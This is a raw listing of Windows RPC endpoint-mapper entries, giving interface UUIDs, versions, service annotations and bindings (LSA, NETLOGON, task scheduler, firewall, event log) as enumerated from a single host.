  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_EAS_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsapolicylookup]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsasspirpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[protected_storage]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[SidKey Local End Point]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[samss lpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[NETLOGON_LRPC]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49667]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_np:[\\pipe\\lsass]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[audit]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[securityevent]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSARPC_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsacap]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_EAS_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsapolicylookup]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsasspirpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[protected_storage]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[SidKey Local End Point]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[samss lpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[NETLOGON_LRPC]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49667]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_np:[\\pipe\\lsass]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[audit]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[securityevent]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSARPC_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsacap]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSA_EAS_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsapolicylookup]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsasspirpc]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[protected_storage]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[SidKey Local End Point]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[samss lpc]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[NETLOGON_LRPC]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_ip_tcp:[49667]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_ip_tcp:[49669]
  552d076a-cb29-4e44-8b6a-d15e59e2c0af v1.0 (IP Transition Configuration endpoint): ncalrpc:[LRPC-ca5162c0af95019a44]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[LRPC-ca5162c0af95019a44]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[TeredoDiagnostics]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[TeredoControl]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[LRPC-ca5162c0af95019a44]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[TeredoDiagnostics]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[TeredoControl]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[LRPC-ca5162c0af95019a44]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[TeredoDiagnostics]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[TeredoControl]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[OLEE77011E269DCE51DD2E4F924FAD1]
  abfb6ca3-0c5e-4734-9285-0aee72fe8d1c v1.0 (): ncalrpc:[OLE19D6877DFD883D501D105585174A]
  abfb6ca3-0c5e-4734-9285-0aee72fe8d1c v1.0 (): ncalrpc:[LRPC-b13ecd852a899d0da8]
  b37f900a-eae4-4304-a2ab-12bb668c0188 v1.0 (): ncalrpc:[OLE19D6877DFD883D501D105585174A]
  b37f900a-eae4-4304-a2ab-12bb668c0188 v1.0 (): ncalrpc:[LRPC-b13ecd852a899d0da8]
  e7f76134-9ef5-4949-a2d6-3368cc0988f3 v1.0 (): ncalrpc:[OLE19D6877DFD883D501D105585174A]
  e7f76134-9ef5-4949-a2d6-3368cc0988f3 v1.0 (): ncalrpc:[LRPC-b13ecd852a899d0da8]
  7aeb6705-3ae6-471a-882d-f39c109edc12 v1.0 (): ncalrpc:[OLE19D6877DFD883D501D105585174A]
  7aeb6705-3ae6-471a-882d-f39c109edc12 v1.0 (): ncalrpc:[LRPC-b13ecd852a899d0da8]
  f44e62af-dab1-44c2-8013-049a9de417d6 v1.0 (): ncalrpc:[OLE19D6877DFD883D501D105585174A]
  f44e62af-dab1-44c2-8013-049a9de417d6 v1.0 (): ncalrpc:[LRPC-b13ecd852a899d0da8]
  c2d1b5dd-fa81-4460-9dd6-e7658b85454b v1.0 (): ncalrpc:[OLE19D6877DFD883D501D105585174A]
  c2d1b5dd-fa81-4460-9dd6-e7658b85454b v1.0 (): ncalrpc:[LRPC-b13ecd852a899d0da8]
  f2c9b409-c1c9-4100-8639-d8ab1486694a v1.0 (Witness Client Upcall Server): ncalrpc:[LRPC-ccd647ec1114a89cba]
  eb081a0d-10ee-478a-a1dd-50995283e7a8 v3.0 (Witness Client Test Interface): ncalrpc:[LRPC-ccd647ec1114a89cba]
  7f1343fe-50a9-4927-a778-0c5859517bac v1.0 (DfsDs service): ncalrpc:[LRPC-ccd647ec1114a89cba]
  7f1343fe-50a9-4927-a778-0c5859517bac v1.0 (DfsDs service): ncacn_np:[\\PIPE\\wkssvc]
  3473dd4d-2e88-4006-9cba-22570909dd10 v5.1 (WinHttp Auto-Proxy Service): ncalrpc:[LRPC-341d8e2deb6a697a50]
  3473dd4d-2e88-4006-9cba-22570909dd10 v5.1 (WinHttp Auto-Proxy Service): ncalrpc:[b430042b-ec33-418e-b121-06b140a96af4]
  dd490425-5325-4565-b774-7e27d6c09c24 v1.0 (Base Firewall Engine API): ncalrpc:[LRPC-60b5ee9cad5367edf2]
  7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 (Fw APIs): ncalrpc:[LRPC-60b5ee9cad5367edf2]
  7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 (Fw APIs): ncalrpc:[LRPC-bfeb6e206f46ef05cd]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-60b5ee9cad5367edf2]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-bfeb6e206f46ef05cd]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-a8fccacee4f4f89e31]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-60b5ee9cad5367edf2]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-bfeb6e206f46ef05cd]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-a8fccacee4f4f89e31]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-7240ee54545d27b7e6]
  df4df73a-c52d-4e3a-8003-8437fdf8302a v0.0 (WM_WindowManagerRPC\Server): ncalrpc:[LRPC-c921ecce961477dd10]
  0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53 v1.0 (): ncalrpc:[LRPC-ac2e606264eadad500]
  1ff70682-0a51-30e8-076d-740be8cee98b v1.0 (): ncalrpc:[LRPC-ac2e606264eadad500]
  1ff70682-0a51-30e8-076d-740be8cee98b v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 (): ncalrpc:[LRPC-ac2e606264eadad500]
  378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[LRPC-ac2e606264eadad500]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncacn_np:[\\PIPE\\atsvc]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[ubpmtaskhostchannel]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[LRPC-113f2e31b493a2a3c5]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[LRPC-ac2e606264eadad500]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[ubpmtaskhostchannel]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[LRPC-113f2e31b493a2a3c5]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncacn_ip_tcp:[49666]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[LRPC-ac2e606264eadad500]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[ubpmtaskhostchannel]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[LRPC-113f2e31b493a2a3c5]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncacn_ip_tcp:[49666]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[senssvc]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-a402f09e1136f22be6]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[IUserProfile2]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-d299b51240a217d7fb]
  2eb08e3e-639f-4fba-97b1-14f878961076 v1.0 (Group Policy RPC Interface): ncalrpc:[LRPC-6e66bd44da63c6b7fd]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Event log TCPIP): ncalrpc:[eventlog]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Event log TCPIP): ncacn_np:[\\pipe\\eventlog]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Event log TCPIP): ncacn_ip_tcp:[49665]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 (DHCP Client LRPC Endpoint): ncalrpc:[dhcpcsvc]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 (DHCPv6 Client LRPC Endpoint): ncalrpc:[dhcpcsvc]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 (DHCPv6 Client LRPC Endpoint): ncalrpc:[dhcpcsvc6]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-dca82d9822790c1b92]
  a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 (): ncalrpc:[LRPC-dca82d9822790c1b92]
  a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 (): ncalrpc:[LRPC-a3737bdd538536e91d]
  30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 (NRP server endpoint): ncalrpc:[LRPC-4db6eeb24515162d41]
  7ea70bcf-48af-4f6a-8968-6a440754d5fa v1.0 (NSI server endpoint): ncalrpc:[LRPC-b6d6907282f4cefa41]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-51da90a59253c8bf19]
  5222821f-d5e2-4885-84f1-5f6185a0ec41 v1.0 (Network Connection Broker server endpoint for NCB Reset module): ncalrpc:[LRPC-51da90a59253c8bf19]
  5222821f-d5e2-4885-84f1-5f6185a0ec41 v1.0 (Network Connection Broker server endpoint for NCB Reset module): ncalrpc:[LRPC-fe75f6ace764fa1349]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-51da90a59253c8bf19]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-fe75f6ace764fa1349]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[OLE0E2F9F1420FA359CA499DB74D3E5]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-de77a62b9762b2b2b4]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (Network Connection Broker server endpoint): ncalrpc:[LRPC-51da90a59253c8bf19]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (Network Connection Broker server endpoint): ncalrpc:[LRPC-fe75f6ace764fa1349]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (Network Connection Broker server endpoint): ncalrpc:[OLE0E2F9F1420FA359CA499DB74D3E5]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (Network Connection Broker server endpoint): ncalrpc:[LRPC-de77a62b9762b2b2b4]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-bab71b4a6d30b36460]
  4bec6bb8-b5c2-4b6f-b2c1-5da5cf92d0d9 v1.0 (): ncalrpc:[umpo]
  085b0334-e454-4d91-9b8c-4134f9e793f3 v1.0 (): ncalrpc:[umpo]
  8782d3b9-ebbd-4644-a3d8-e8725381919b v1.0 (): ncalrpc:[umpo]
  3b338d89-6cfa-44b8-847e-531531bc9992 v1.0 (): ncalrpc:[umpo]
  bdaa0970-413b-4a3e-9e5d-f6dc9d7e0760 v1.0 (): ncalrpc:[umpo]
  5824833b-3c1a-4ad2-bdfd-c31d19e23ed2 v1.0 (): ncalrpc:[umpo]
  0361ae94-0316-4c6c-8ad8-c594375800e2 v1.0 (): ncalrpc:[umpo]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[umpo]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[actkernel]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[umpo]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[actkernel]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[umpo]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[actkernel]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[umpo]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[actkernel]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[umpo]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[actkernel]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[umpo]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[actkernel]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[umpo]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[actkernel]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[umpo]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[actkernel]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[umpo]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[actkernel]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[umpo]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[actkernel]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[umpo]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[actkernel]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[umpo]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[actkernel]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  2c7fd9ce-e706-4b40-b412-953107ef9bb0 v0.0 (): ncalrpc:[umpo]
  c521facf-09a9-42c5-b155-72388595cbf0 v0.0 (): ncalrpc:[umpo]
  1832bcf6-cab8-41d4-85d2-c9410764f75a v1.0 (): ncalrpc:[umpo]
  4dace966-a243-4450-ae3f-9b7bcb5315b8 v2.0 (): ncalrpc:[umpo]
  178d84be-9291-4994-82c6-3f909aca5a03 v1.0 (): ncalrpc:[umpo]
  e53d94ca-7464-4839-b044-09a2fb8b3ae5 v1.0 (): ncalrpc:[umpo]
  fae436b0-b864-4a87-9eda-298547cd82f2 v1.0 (): ncalrpc:[umpo]
  082a3471-31b6-422a-b931-a54401960c62 v1.0 (): ncalrpc:[umpo]
  6982a06e-5fe2-46b1-b39c-a2c545bfa069 v1.0 (): ncalrpc:[umpo]
  0ff1f646-13bb-400a-ab50-9a78f2b7a85a v1.0 (): ncalrpc:[umpo]
  4ed8abcc-f1e2-438b-981f-bb0e8abc010c v1.0 (): ncalrpc:[umpo]
  95406f0b-b239-4318-91bb-cea3a46ff0dc v1.0 (): ncalrpc:[umpo]
  0d47017b-b33b-46ad-9e18-fe96456c5078 v1.0 (): ncalrpc:[umpo]
  dd59071b-3215-4c59-8481-972edadc0f6a v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-400246e3457a17efd5]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[umpo]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[actkernel]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-400246e3457a17efd5]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-e4ecfbb8cbe0711a86]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-400246e3457a17efd5]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-e4ecfbb8cbe0711a86]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[umpo]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[actkernel]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-400246e3457a17efd5]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-e4ecfbb8cbe0711a86]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-7b6aaec5d1d1ffc5ad]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-400246e3457a17efd5]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-e4ecfbb8cbe0711a86]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-7b6aaec5d1d1ffc5ad]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[csebpub]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[umpo]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[actkernel]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-7a85dc167dd835715d]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[OLEE5CAF79970099B5CBE8C2D9CBA48]
